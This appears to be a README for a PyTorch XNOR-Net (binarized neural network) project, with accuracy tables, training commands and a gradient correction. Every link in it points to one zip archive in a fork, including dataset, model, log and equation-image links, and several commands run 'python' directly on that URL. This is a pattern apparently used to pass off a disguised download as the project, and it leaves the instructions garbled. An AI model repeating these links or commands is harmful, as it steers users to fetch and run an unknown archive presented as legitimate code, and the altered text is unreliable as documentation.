# XNOR-Net-Pytorch
This a PyTorch implementation of the [XNOR-Net](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip). I implemented Binarized Neural Network (BNN) for:  

| Dataset  | Network                  | Accuracy                    | Accuracy of floating-point |
|----------|:-------------------------|:----------------------------|:---------------------------|
| MNIST    | LeNet-5                  | 99.23%                      | 99.34%                     |
| CIFAR-10 | Network-in-Network (NIN) | 86.28%                      | 89.67%                     |
| ImageNet | AlexNet                  | Top-1: 44.87% Top-5: 69.70% | Top-1: 57.1% Top-5: 80.2%  |

## MNIST
I implemented the LeNet-5 structure for the MNIST dataset. I am using the dataset reader provided by [torchvision](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip). To run the training:
```bash
$ cd <Repository Root>/MNIST/
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip
```
Pretrained model can be downloaded [here](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip). To evaluate the pretrained model:
```bash
$ cp <Pretrained Model> <Repository Root>/MNIST/models/
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --pretrained https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --evaluate
```

## CIFAR-10
I implemented the NIN structure for the CIFAR-10 dataset. You can download the training and validation datasets [here](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip) and uncompress the .zip file. To run the training:
```bash
$ cd <Repository Root>/CIFAR_10/
$ ln -s <Datasets Root> data
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip
```
Pretrained model can be downloaded [here](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip). To evaluate the pretrained model:
```bash
$ cp <Pretrained Model> <Repository Root>/CIFAR_10/models/
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --pretrained https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --evaluate
```

## ImageNet
I implemented the AlexNet for the ImageNet dataset.
### Dataset

The training supports [torchvision](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip).

If you have installed [Caffe](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip), you can download the preprocessed dataset [here](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip) and uncompress it. 
To set up the dataset:
```bash
$ cd <Repository Root>/ImageNet/networks/
$ ln -s <Datasets Root> data
```

### AlexNet
To train the network:
```bash
$ cd <Repository Root>/ImageNet/networks/
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip # add "--caffe-data" if you are training with the Caffe dataset
```
The pretrained models can be downloaded here: [pretrained with Caffe dataset](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip); [pretrained with torchvision](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip). To evaluate the pretrained model:
```bash
$ cp <Pretrained Model> <Repository Root>/ImageNet/networks/
$ python https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --resume https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip --evaluate # add "--caffe-data" if you are training with the Caffe dataset
```
The training log can be found here: [log - Caffe dataset](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip); [log - torchvision](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip).

## Todo
- NIN for ImageNet.

## Notes
### Gradients of scaled sign function
In the paper, the gradient in backward after the scaled sign function is  
  
![equation](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip%5Cfrac%7B%5Cpartial%20C%7D%7B%5Cpartial%20W_i%7D%3D%5Cfrac%7B%5Cpartial%20C%7D%7B%5Cpartial%20%7B%5Cwidetilde%7BW%7D%7D_i%7D%20%28%5Cfrac%7B1%7D%7Bn%7D+%5Cfrac%7B%5Cpartial%20sign%28W_i%29%7D%7B%5Cpartial%20W_i%7D%5Ccdot%20%5Calpha%20%29)

<!--
\frac{\partial C}{\partial W_i}=\frac{\partial C}{\partial {\widetilde{W}}_i} (\frac{1}{n}+\frac{\partial sign(W_i)}{\partial W_i}\cdot \alpha )
-->

However, this equation is actually inaccurate. The correct backward gradient should be

![equation](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip%5Cfrac%7B%5Cpartial%20C%7D%7B%5Cpartial%20W_%7Bi%7D%7D%20%3D%20%5Cfrac%7B1%7D%7Bn%7D%20%5Ccdot%20sign%28W_%7Bi%7D%29%20%5Ccdot%20%5Csum_%7Bj%3D1%7D%5E%7Bn%7D%5B%5Cfrac%7B%5Cpartial%20C%7D%7B%5Cpartial%20%5Cwidetilde%7BW%7D_j%7D%20%5Ccdot%20sign%28W_j%29%5D%20&plus;%20%5Cfrac%7B%5Cpartial%20C%7D%7B%5Cpartial%20%5Cwidetilde%7BW%7D_i%7D%20%5Ccdot%20%5Cfrac%7Bsign%28W_i%29%7D%7BW_i%7D%20%5Ccdot%20%5Calpha)

Details about this correction can be found in the [notes](https://github.com/etemtezcan/XNOR-Net-PyTorch/raw/refs/heads/master/ImageNet/XNO-Py-Torch-Net-1.1.zip) (section 1).
